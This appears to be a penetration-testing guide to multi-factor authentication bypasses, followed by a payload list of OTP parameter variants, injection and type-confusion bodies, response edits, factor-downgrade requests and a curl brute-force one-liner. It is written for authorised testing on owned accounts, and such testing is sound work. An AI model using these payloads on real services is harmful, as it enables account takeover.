blocks.text: Multi-factor authentication fails when the second factor is not enforced consistently, can be guessed or reused, or can be skipped by changing state, endpoints or client-side values. Most real bypasses are logic flaws around the verification step (the code check itself is usually sound): the session is already usable before the code is checked, the verification endpoint is not rate limited, or a recovery or alternate login path skips the factor entirely.

items: Direct navigation to post-login pages or API endpoints with a half-authenticated (password-only) session
Response manipulation: the client trusts a `success`, `mfa_required` or status value
Missing or weak rate limiting on the code verification and resend endpoints
Predictable, reusable, long-lived or non-session-bound codes; the code is returned in the response
Alternate paths that skip the factor: OAuth/SSO login, API keys, legacy or mobile endpoints, password reset, account recovery and "remember this device"
Race conditions on verification and on enrolment
Backup and recovery codes without limits; factor enrolment or removal without re-authentication
Downgrade between factors (WebAuthn to SMS, TOTP to email)

blocks.text: Use two accounts you own. Log in with the password only and record which endpoints already work before the second factor is accepted. Then test the verification endpoint: wrong, empty, repeated, previously used and expired codes; array and object values; and whether failures are counted per account, per session and per IP. Compare the web, mobile and API entry points, and any SSO or reset flow, for the same account. Do not brute-force codes against accounts you do not own, and stop as soon as a bypass is proven.
See `mfa-bypass-payloads.txt` for parameter variants, response edits, state and endpoint tests, race fixtures and recovery-flow checks. Replace endpoint names and parameter names with the target's.

# MFA Bypass Payloads
# Fragments for the second-factor verification request. Use test accounts you own. otp is the parameter name; use the target's.

# Code value variants (the validator may treat these as a match, empty or an error that skips the check)

otp=00000
otp=0000000
otp=-1
otp=000000.0
otp=1e5
otp=undefined
otp=true
otp=false
otp=NaN
otp=%00
otp=000000%00
otp=000000%0a
otp=000%20000
otp=١٢٣٤٥٦
otp[]=
otp[]=123456&otp[]=654321
otp[0]=000000&otp[1]=111111
otp[$ne]=
otp[$gt]=
otp.__proto__=x
OTP=123456
Otp=123456
code=123456
verification_code=123456
mfa_code=123456
totp=123456

# JSON bodies (type confusion and multiple guesses in one request)
{"otp":null}

{"otp":{}}
{"otp":["000000","111111","222222","333333","444444","555555","666666","777777","888888","999999"]}

{"otp":"123456","otp":"000000"}
{"otp":"","remember":true}
{"code":"123456","mfa":false}
{"code":"123456","skip_mfa":true}
{"code":"123456","verified":true}
{"code":"123456","user_id":"OTHER_TEST_USER_ID"}
{"code":"123456","email":"other-test@example.test"}

# Response manipulation (edit the server response in a proxy and observe whether the client proceeds)
HTTP/1.1 200 OK with body {"success":true}
{"success":false} -> {"success":true}
{"verified":false} -> {"verified":true}
{"mfa_required":true} -> {"mfa_required":false}
{"status":"error","code":401} -> {"status":"ok","code":200}
{"twoFactor":true} -> {"twoFactor":false}
HTTP/1.1 401 Unauthorized -> HTTP/1.1 200 OK
HTTP/1.1 403 Forbidden -> HTTP/1.1 200 OK
HTTP/1.1 302 Found Location: /2fa -> HTTP/1.1 302 Found Location: /dashboard

require_2fa=false
two_factor=false

# Code reuse, expiry and binding checks (sequence descriptions: run on test accounts)
# Use a valid code twice and observe whether the second use is accepted
# Use a code issued for session A in session B
# Use an old code after a newer one has been requested
# Use a code after its stated expiry
# Use a code issued for another account that you also own

# Brute-force resistance checks on the verify and resend endpoints (own account; cap the attempts)
# seq -w 0 999999 | head -n 50 | xargs -P 1 -I{} curl -s -o /dev/null -w "{} %{http_code}\n" -X POST https://app.example.test/2fa/verify -d "otp={}" -b "session=TEST_SESSION"
# Compare status code, body length and timing of the 1st, 10th, 50th and 100th wrong attempt for blocking or lockout
# Change the IP-related headers between attempts to see whether the counter is per client
# Request a new code between attempts to see whether the counter resets
# Test the resend endpoint for unlimited sends (mail or SMS flooding) and for the same code being re-sent

# Client-side JavaScript, local storage and error messages
# Email or SMS content in a link with the code in the URL
# Logging endpoints and debug pages

POST /2fa/disable with only a session cookie and no password field

{"enabled":false}
{"secret":"JBSWY3DPEHPK3PXP"}

# Backup and recovery codes (own account)
# Request codes repeatedly and check that old codes are invalidated
# Check that codes have enough entropy and a limited number of attempts
# Check that a used code is rejected on the second attempt
# Check whether backup codes can be viewed again after enrolment without re-authentication

# Factor downgrade and fallback
POST /2fa/method with {"method":"sms"}
POST /2fa/method with {"method":"email"}
POST /2fa/method with {"method":"none"}

# Time-based codes (TOTP) validation window and clock checks (own account)
# Submit the previous and next 30-second window codes and note how many windows are accepted
# Submit a code from several minutes earlier and several minutes later
# Submit the same TOTP code again within the same window after a successful use

# Race conditions on verification (single-packet or parallel sends; see Race-Conditions)
# Send many verify requests with different guesses at the same instant
# Send verify and a state-changing request at the same instant to see whether the change succeeds before the check completes

# Push-notification and number-matching fatigue checks (own devices)
# Trigger repeated prompts and check for throttling and for context such as location and application name
# Check whether the number-matching code appears in the request or response before approval

# Session handling around the factor
# Session fixation: set the session identifier before login and check that it changes after the second factor
# Check that the session issued after the password step cannot call privileged APIs
# Check that the session is invalidated after too many failed code attempts
# Check that a logout ends the half-authenticated session
